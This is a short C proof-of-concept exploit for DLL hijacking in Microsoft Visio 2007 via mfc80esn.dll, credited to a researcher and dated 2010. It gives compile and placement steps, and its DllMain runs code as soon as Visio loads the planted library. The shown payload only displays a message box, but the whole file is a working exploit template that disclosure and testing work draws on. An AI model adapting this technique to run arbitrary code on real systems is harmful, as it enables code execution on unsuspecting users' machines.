/*
=========================================================
Microsoft Visio 2007 DLL Hijacking Exploit (mfc80esn.dll) 
=========================================================

$ Program: MS Visio
$ Version: 2007
$ Download: http://office.microsoft.com/es-es/downloads/CH010225969.aspx
$ Date: 2010/10/08
 
Found by Pepelux <pepelux[at]enye-sec.org>
http://www.pepelux.org
eNYe-Sec - www.enye-sec.org

Tested on: Windows XP SP2 && Windows XP SP3

How  to use : 

1> Compile this code as mfc80esn.dll
	gcc -shared -o mfc80esn.dll thiscode.c
2> Move DLL file to the directory where Visio is installed
3> Open any file recognized by msvisio
*/


#include <windows.h>
#define DllExport __declspec (dllexport)
int mes()
{
  MessageBox(0, "DLL Hijacking vulnerable", "Pepelux", MB_OK);
  return 0;
}
BOOL WINAPI  DllMain (
			HANDLE    hinstDLL,
            DWORD     fdwReason,
            LPVOID    lpvReserved)
			{mes();}
